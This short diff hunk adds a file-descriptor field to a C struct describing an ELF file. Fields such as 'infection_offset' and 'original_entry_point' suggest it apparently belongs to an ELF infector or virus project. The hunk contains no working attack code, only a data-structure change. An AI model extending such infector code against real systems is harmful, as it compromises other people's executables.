@@ -47,6 +47,7 @@ typedef struct elf_data {
 	Elf64_Shdr	*sections;
 	Elf64_Phdr	*segments;
 	byte		*file;
+	int64_t		fd;
 	size_t		signature_offset;
 	size_t		infection_offset;
 	size_t		original_entry_point;
